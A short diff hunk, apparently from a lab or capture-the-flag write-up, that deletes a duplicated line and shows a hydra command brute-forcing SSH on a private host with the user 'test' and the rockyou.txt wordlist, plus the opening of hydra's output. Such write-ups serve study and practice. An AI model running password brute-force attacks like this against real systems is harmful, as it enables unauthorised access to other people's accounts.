@@ -226,7 +226,6 @@ Brute forcing SSH connection with `hydra` using `test` username and `rockyou.txt
 ```
 $ hydra -l test -P /usr/share/wordlists/rockyou.txt 192.168.1.146 -s 7223 -vV -f -t 4 ssh
 
-$ hydra -l test -P /usr/share/wordlists/rockyou.txt 192.168.1.146 -s 7223 -vV -f -t 4 ssh
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-08 13:46:46
